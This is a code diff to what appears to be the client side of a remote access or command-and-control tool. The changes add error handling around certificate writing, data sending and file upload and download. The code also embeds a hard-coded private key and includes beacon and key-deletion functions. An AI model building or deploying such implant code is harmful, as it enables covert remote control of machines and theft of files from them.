@@ -56,8 +56,14 @@ h8jRgw5kMzLy4zdXXTovEW1nsjO7G3SUc9GC3EOOx3DFRUDC4rgUzBrRCxh2j574
 CwszvFk5+ZOFJ+o66mAc4OSkt8aiRMxjHg3vSjsrW4EVqGRz+ohuoDDoKIxlgRqN
 H1fwfP6xGzn/UjUTNWuz
 -----END CERTIFICATE-----'''
-    with open("server_cert",'w') as file:
-        file.write(server_cert)
+    try:
+        with open("server_cert",'w') as file:
+            file.write(server_cert)
+    except:
+        if VERBOSE:
+            print_fail("Unable to create ssl certs")
+            print(exc_info())
+
     client_cert = '''\
 -----BEGIN CERTIFICATE-----
 MIIDazCCAlOgAwIBAgIUbpFUojamR1OPhQJUwDJzW0W1sG8wDQYJKoZIhvcNAQEL
@@ -80,8 +86,13 @@ ijlopmmNvPM+rur2VGv8FheKUkyUNM0U7l6NR17ao/hVIzq7ga86e5Xidl8/gbUH
 IbWmkL3apSpCeQx2nKBMwT8c+lJixO40meyxpIzTnEuTSHEXYY5/h2jlvNmLcScO
 z/BKKDg5xkjlf0TAyaAo
 -----END CERTIFICATE-----'''
-    with open("client_cert",'w') as file:
-        file.write(client_cert)
+    try:
+        with open("client_cert",'w') as file:
+            file.write(client_cert)
+    except:
+        if VERBOSE:
+            print_fail("Unable to create ssl certs")
+            print(exc_info())
     client_key= '''\
 -----BEGIN PRIVATE KEY-----
 MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClYnr6PZrghUhx
@@ -111,8 +122,13 @@ vU4QrlqMsOaEzNRfwfwKQidK4jbzvTZMzADjQodHhq0x/yv3SVL5Z2kP6VEXIkji
 kol5xIDAD/43O2UzDTXFW0hZk4CFy7EvD9PpBXpl0PtYiojw6rHaHJWeXXSe9+LJ
 TZdCKivQ2PsE9Uw8BwCZYJI=
 -----END PRIVATE KEY-----'''
-    with open("client_key",'w') as file:
-        file.write(client_key)
+    try:
+        with open("client_key",'w') as file:
+            file.write(client_key)
+    except:
+        if VERBOSE:
+            print_fail("Unable to create ssl certs")
+            print(exc_info())
 
 def push_uuid(conn):
     send_data(conn, UUID)
@@ -123,7 +139,8 @@ def delete_keys():
         remove("client_cert")
         remove("server_cert")
     except FileNotFoundError:
-        pass
+        if VERBOSE:
+            print_warn("Unable to Delete SSL Keys")
 
 def sysinfo():
     date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
@@ -145,13 +162,21 @@ def send_data(conn, plain_text):
     if type(plain_text) is int:
         plain_text = str(plain_text)
     msg = plain_text + "[END]"
-    conn.send(msg.encode('utf-8'))
+    try:
+        conn.send(msg.encode('utf-8'))
+    except:
+        if VERBOSE:
+            print_fail("Connection Interrupted - Unable to Send")
     if VERBOSE:
         print_info("Sent:\n"  +plain_text)
 
 def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
-    f = open(file_name, 'rb')
-    data = f.read(1024)
+    try:
+        f = open(file_name, 'rb')
+        data = f.read(1024)
+    except:
+        if VERBOSE:
+            print_fail("IO Error, Unable to Read File for Transfer")
     if VERBOSE:
         print_info("Sending File:\n" + file_name)
     while data:
@@ -164,20 +189,24 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
 
 def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
     file_name = file_name.rstrip("[END]")
-    f = open(file_name,'wb')
-    if VERBOSE:
-        print_info("Receiving --> {}".format(file_name))
-    while True: 
-        data = conn.recv(128)
-        if data.endswith(b"[END]"):
-            f.write(data.rstrip(b"[END]"))
-            if VERBOSE:
-                print_good("Transfer completed")
-            f.close()
-            break
-        else:
-            f.write(data)
-    f.close()
+    try:
+        f = open(file_name,'wb')
+        if VERBOSE:
+            print_info("Receiving --> {}".format(file_name))
+        while True: 
+            data = conn.recv(128)
+            if data.endswith(b"[END]"):
+                f.write(data.rstrip(b"[END]"))
+                if VERBOSE:
+                    print_good("Transfer completed")
+                f.close()
+                break
+            else:
+                f.write(data)
+        f.close()
+    except:
+        if VERBOSE:
+            print_fail("IO Error - Unable to Write File from Server")
 
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
